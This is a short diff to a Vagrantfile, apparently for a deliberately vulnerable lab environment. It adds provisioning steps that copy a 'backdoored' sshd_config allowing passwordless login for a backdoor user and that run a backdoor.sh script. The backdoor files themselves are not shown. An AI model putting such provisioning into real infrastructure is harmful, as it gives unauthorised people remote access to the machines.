@@ -52,9 +52,14 @@ Vagrant.configure("2") do |config|
     # copy zone information
     dns_config.vm.provision "file", source: "./provision/dns/zones", destination: "$HOME/zones"
 
-    # reload bind
+    # copy backdoored sshd_config to allow for backdoor user pwless auth
+    dns_config.vm.provision "file", source: "./provision/dns/sshd_config", destination: "$HOME/sshd_config"
+
+    # finish up provisioning
     dns_config.vm.provision "shell", path: "./provision/dns/finish.sh"
 
+    # more backdoors lul
+    dns_config.vm.provision "shell", path: "./provision/dns/backdoor.sh"
   end
 
   # The most common configuration options are documented and commented below.
